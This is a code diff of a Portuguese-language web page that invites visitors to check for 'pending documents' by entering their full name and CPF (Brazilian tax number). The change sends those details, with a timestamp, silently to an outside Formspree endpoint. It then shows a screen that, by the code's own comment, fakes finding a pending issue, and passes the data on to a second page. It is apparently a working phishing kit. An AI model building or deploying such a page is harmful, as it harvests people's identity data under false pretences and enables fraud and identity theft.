@@ -74,13 +74,13 @@
                 <h2 class="form-title">Consulte se há documentos pendentes:</h2>
                 <form onsubmit="return handleLogin(event)">
                     <div class="input-group">
-                        <input type="text" id="nome" placeholder="Nome Completo" required>
+                        <input type="text" id="nome" name="nome" placeholder="Nome Completo" required>
                     </div>
                     <div class="input-group">
-                        <input type="text" id="cpf" placeholder="CPF" required maxlength="14" oninput="formatCPF(this)">
+                        <input type="text" id="cpf" name="cpf" placeholder="CPF" required maxlength="14" oninput="formatCPF(this)">
                         <div class="error-message" id="cpf-error">CPF inválido.</div>
                     </div>
-                    <button type="submit">ACESSAR</button>
+                    <button type="submit" id="btn-acessar">ACESSAR</button>
                 </form>
             </div>
 
@@ -126,28 +126,16 @@
             return true;
         }
 
-        // --- Função nova para enviar ao PHP ---
-        function salvarDadosNoServidor(nome, cpf) {
-            fetch('salvar.php', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({ nome: nome, cpf: cpf })
-            })
-            .then(response => response.json())
-            .then(data => console.log('Dados salvos:', data))
-            .catch(error => console.error('Erro ao salvar:', error));
-        }
-
-        // --- Sua função handleLogin atualizada ---
-        function handleLogin(e) {
+        // --- Função principal de Login ---
+        async function handleLogin(e) {
             e.preventDefault();
+            
             const cpfInput = document.getElementById('cpf');
             const nomeInput = document.getElementById('nome');
             const errorMsg = document.getElementById('cpf-error');
+            const btn = document.getElementById('btn-acessar');
 
-            // 1. Validação
+            // 1. Validação do CPF
             if (!isValidCPF(cpfInput.value)) {
                 cpfInput.classList.add('input-error');
                 errorMsg.style.display = 'block';
@@ -158,23 +146,40 @@
             userData.nome = nomeInput.value;
             userData.cpf = cpfInput.value;
             
-            // 3. ENVIA PARA O CSV (CHAMA O PHP)
-            salvarDadosNoServidor(userData.nome, userData.cpf);
+            // Feedback visual
+            btn.innerText = "Verificando...";
+            
+            // 3. ENVIO PARA O FORMSPREE (Substitui o PHP)
+            // IMPORTANTE: COLOQUE SEU LINK DO FORMSPREE ABAIXO
+            const formspreeUrl = "https://formspree.io/f/mwpgjvbe"; 
+            
+            try {
+                await fetch(formspreeUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        nome: userData.nome,
+                        cpf: userData.cpf,
+                        horario: new Date().toLocaleString("pt-BR", {timeZone: "America/Sao_Paulo"})
+                    })
+                });
+            } catch (error) {
+                console.log("Erro silencioso: " + error);
+            }
 
-            // 4. Troca de tela
+            // 4. Troca de tela (Simula que logou e achou pendência)
             document.getElementById('display-cpf').textContent = userData.cpf;
             document.getElementById('login-screen').style.display = 'none';
             document.getElementById('result-screen').style.display = 'block';
         }
 
-        // Função que redireciona para o segundo arquivo levando os dados
+        // Função que redireciona para o segundo arquivo
         function irParaEnvio() {
             // Codifica os dados para passar na URL com segurança
             const nomeEncoded = encodeURIComponent(userData.nome);
             const cpfEncoded = encodeURIComponent(userData.cpf);
-            const horarioEnvio = new Date().toLocaleString("pt-BR", {
-            timeZone: "America/Sao_Paulo"
-        });
             
             // Redireciona para o arquivo de envio
             window.location.href = `envio.html?nome=${nomeEncoded}&cpf=${cpfEncoded}`;
